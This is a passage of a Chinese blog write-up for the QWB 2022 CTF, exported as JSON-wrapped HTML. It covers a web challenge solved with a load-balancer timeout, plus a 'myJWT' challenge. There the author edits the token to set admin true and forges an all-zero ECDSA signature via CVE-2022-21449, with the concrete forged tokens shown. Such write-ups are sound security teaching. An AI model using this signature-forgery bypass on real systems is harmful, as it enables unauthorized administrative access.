class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\">#&#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\"># pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\">#</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\">#location ~ \\.php$ &#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\">#    root           /usr/local/openresty/nginx/html;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\">#    fastcgi_pass   127.0.0.1:9000;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\">#    fastcgi_index  index.php;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\">#    fastcgi_param  SCRIPT_FILENAME  /scripts$fastcgi_script_name;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\">#    include        fastcgi_params;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\">#&#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\"># deny access to .htaccess files, if Apache&#39;s document root</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\"># concurs with nginx&#39;s one</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\">#</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\">#location ~ /\\.ht &#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\">#    deny  all;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #676E95; font-style: italic\">#&#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">&#125;</span></span></code></pre></div><p>文件总共都提到了仨地址，直接都填上，然后 <code>权重</code> 的话，根据多年建站经验来说，数值越低，优先级越高，我们直接都设置为 <code>0</code> ,或者相同数，然后让这仨冲突去吧。</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">127.0.0.1</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">127.0.0.1:8088</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">127.0.0.1:900</span></span></code></pre></div><p>静待十几秒，页面返回了 <code>flag</code> ，同时控制台里可以看到请求的接口 <code>504</code> 超时了<br><img src=\"/./images/14.png\" alt=\"14\"></p>\n<h3 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h3><h4 id=\"myJWT\"><a href=\"#myJWT\" class=\"headerlink\" title=\"myJWT\"></a>myJWT</h4><p><code>nc</code> 连接后输入用户名，然后输入 <code>1</code>  获得 <code>generate token</code>，返回一段 <code>JWT</code>，然后输入 <code>2</code> 去 <code>getflag</code> 提示输入 <code>your token</code> 后返回 <code>You are not the administrator.</code>，我们直接解密 <code>JWT</code> 看看</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">eyJ0eXAiOiJKV1QiLCJhbGciOiJteUVTIn0</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #C3E88D\">.eyJpc3MiOiJxd2IiLCJuYW1lIjoiaWFtaTIzMyIsImFkbWluIjpmYWxzZSwiZXhwIjoxNjU5MzM4MTIxNzAwfQ==.5IQnppqB0_rC4OOaCowkLXVYW6eJ1kI6P-IR3dXll0gDYFjQKyOrHbVp10Hrm3GFh8eRBVZok9_z1rrKUQcJUBqQs-PeZElzqrZwE4rPVxJr2fngi2u97HdG4ItmvWiS</span></span></code></pre></div><p>很明显看到一个权限校验字段 <code>&quot;admin&quot;: false,</code><br><img src=\"/./images/15.png\" alt=\"15\"></p>\n<p>我们先 <code>base64</code> 解码后把 <code>false</code> 改为 <code>true</code>，重新编码为 <code>base64</code></p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">eyJpc3MiOiJxd2IiLCJuYW1lIjoiaWFtaTIzMyIsImFkbWluIjpmYWxzZSwiZXhwIjoxNjU5MzM4MTIxNzAwfQ</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #C3E88D\">=</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&#123;</span><span style=\"color: #FFCB6B\">&quot;iss&quot;</span><span style=\"color: #82AAFF\">:</span><span style=\"color: #FFCB6B\">&quot;qwb&quot;</span><span style=\"color: #FFCB6B\">,</span><span style=\"color: #FFCB6B\">&quot;name&quot;</span><span style=\"color: #82AAFF\">:</span><span style=\"color: #FFCB6B\">&quot;iami233&quot;</span><span style=\"color: #FFCB6B\">,</span><span style=\"color: #FFCB6B\">&quot;admin&quot;</span><span style=\"color: #FFCB6B\">:false,</span><span style=\"color: #FFCB6B\">&quot;exp&quot;</span><span style=\"color: #FFCB6B\">:1659338121700&#125;</span></span>\n<span class=\"line\"><span style=\"color: #89DDFF\">&#123;</span><span style=\"color: #FFCB6B\">&quot;iss&quot;</span><span style=\"color: #82AAFF\">:</span><span style=\"color: #FFCB6B\">&quot;qwb&quot;</span><span style=\"color: #FFCB6B\">,</span><span style=\"color: #FFCB6B\">&quot;name&quot;</span><span style=\"color: #82AAFF\">:</span><span style=\"color: #FFCB6B\">&quot;iami233&quot;</span><span style=\"color: #FFCB6B\">,</span><span style=\"color: #FFCB6B\">&quot;admin&quot;</span><span style=\"color: #FFCB6B\">:true,</span><span style=\"color: #FFCB6B\">&quot;exp&quot;</span><span style=\"color: #FFCB6B\">:1659338121700&#125;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">eyJpc3MiOiJxd2IiLCJuYW1lIjoiaWFtaTIzMyIsImFkbWluIjp0cnVlLCJleHAiOjE2NTkzMzgxMjE3MDB9</span></span></code></pre></div><p><img src=\"/./images/16.png\" alt=\"16\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>CVE-2022-21449：传入sig值对(r, s)为(0, 0)时，可以绕过验证<br>最后一段数据我们用 <code>0</code> 填充，原数据是 <code>128</code> 位，我们也用<code>128</code> 个 <code>A</code> 填充</p></blockquote>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">eyJ0eXAiOiJKV1QiLCJhbGciOiJteUVTIn0</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #C3E88D\">.eyJpc3MiOiJxd2IiLCJuYW1lIjoiaWFtaTIzMyIsImFkbWluIjp0cnVlLCJleHAiOjE2NTkzMzgxMjE3MDB9.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span></span></code></pre></div><p>注意 <code>token</code> 失效时间有点快，所以整体做的时候速度快一点，当然也可以用脚本实现自动化<br><img src=\"/./images/17.png\" alt=\"17\"></p>\n<h3 id=\"Misc\"><a href=\"#Misc\" class=\"headerlink\" title=\"Misc\"></a>Misc</h3><h4 id=\"签到\"><a href=\"#签到\" class=\"headerlink\" title=\"签到\"></a>签到</h4><p>直接复制粘贴即可</p>\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><img src=\"/./images/18.png\" alt=\"18\"></h4><h4 id=\"问卷调查\"><a href=\"#问卷调查\" class=\"headerlink\" title=\"问卷调查\"></a>问卷调查</h4><p>回答问卷提交即可得到flag</p>\n<h4 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a><img src=\"/./images/19.png\" alt=\"19\"></h4>","feature":true,"text":"强网先锋farcefile扫描到 www.zip ，通过测试发现 检查后缀和 content-type ，文件名是随机字符串 数据存储于 cookie 中，通过...","permalink":"/post/强网杯2022","photos":[],"count_time":{"symbolsCount":"15k","symbolsTime":"13 mins."},"categories":[{"name":"CTF","slug":"CTF","count":5,"path":"api/categories/CTF.json"}],"tags":[{"name":"WP","slug":"WP","count":2,"path":"api/tags/WP.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%BC%BA%E7%BD%91%E5%85%88%E9%94%8B\"><span class=\"toc-text\">强网先锋</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#farcefile\"><span class=\"toc-text\">farcefile</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#WP-UM\"><span class=\"toc-text\">WP_UM</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#ASR\"><span class=\"toc-text\">ASR</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#polydiv\"><span class=\"toc-text\">polydiv</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Web\"><span class=\"toc-text\">Web</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#babyweb\"><span class=\"toc-text\">babyweb</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#crash\"><span class=\"toc-text\">crash</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Crypto\"><span class=\"toc-text\">Crypto</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#myJWT\"><span class=\"toc-text\">myJWT</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Misc\"><span class=\"toc-text\">Misc</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E7%AD%BE%E5%88%B0\"><span class=\"toc-text\">签到</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\"><span class=\"toc-text\"></span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%97%AE%E5%8D%B7%E8%B0%83%E6%9F%A5\"><span class=\"toc-text\">问卷调查</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#-1\"><span class=\"toc-text\"></span></a></li></ol></li></ol>","author":{"name":"xmmlaz","slug":"blog-author","avatar":"https://img.luminesight.com/i/2023/10/03/651c16a5a44ab.png","link":"/","description":"更高处见","socials":{"github":"123","twitter":"123","stackoverflow":"123","wechat":"","qq":"","weibo":"123","zhihu":"123","csdn":"123","juejin":"123","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"AWD详解","uid":"5deac5f75bb01e022a6aa8151fb3a9dd","slug":"AWD","date":"2022-11-14T14:34:21.000Z","updated":"2023-10-12T01:44:44.806Z","comments":true,"path":"api/articles/AWD.json","keywords":null,"cover":"https://cover.png","text":"AWDAWD最主要的就是手速！！！ 同时队伍分配一定要合理，密码一定第一时间改掉，修改完配置文件一定记得重启使之生效。 连接SSHshellssh-copy-i...","permalink":"/post/AWD","photos":[],"count_time":{"symbolsCount":"19k","symbolsTime":"17 mins."},"categories":[{"name":"AWD","slug":"AWD","count":1,"path":"api/categories/AWD.json"}],"tags":[{"name":"AWD","slug":"AWD","count":1,"path":"api/tags/AWD.json"}],"author":{"name":"xmmlaz","slug":"blog-author","avatar":"https://img.luminesight.com/i/2023/10/03/651c16a5a44ab.png","link":"/","description":"更高处见","socials":{"github":"123","twitter":"123","stackoverflow":"123","wechat":"","qq":"","weibo":"123","zhihu":"123","csdn":"123","juejin":"123","customs":{}}},"feature":true},"next_post":{"title":"PWN的基本ROP链构造","uid":"20032183053bd6117641c219a5d520bb","slug":"PWN的基本ROP链构造","date":"2022-05-15T10:49:36.000Z","updated":"2023-10-12T01:46:59.813Z","comments":true,"path":"api/articles/PWN的基本ROP链构造.json","keywords":null,"cover":"https://cover.png","text":"查找对应溢出一般的溢出内容是EIP，因为EIP寄存器存储着我们CPU要读取指令的地址 可以通过 cyclic 数字这个指令来获取判断溢出点的一个长度为输入的一个...","permalink":"/post/PWN的基本ROP链构造","photos":[],"count_time":{"symbolsCount":"4.8k","symbolsTime":"4 mins."},"categories":[{"name":"CTF","slug":"CTF","count":5,"path":"api/categories/CTF.json"}],"tags":[{"name":"PWN","slug":"PWN","count":1,"path":"api/tags/PWN.json"}],"author":{"name":"xmmlaz","slug":"blog-author","avatar":"https://img.luminesight.com/i/2023/10/03/651c16a5a44ab.png","link":"/","description":"更高处见","socials":{"github":"123","twitter":"123","stackoverflow":"123","wechat":"","qq":"","weibo":"123","zhihu":"123","csdn":"123","juejin":"123","customs":{}}},"feature":true}}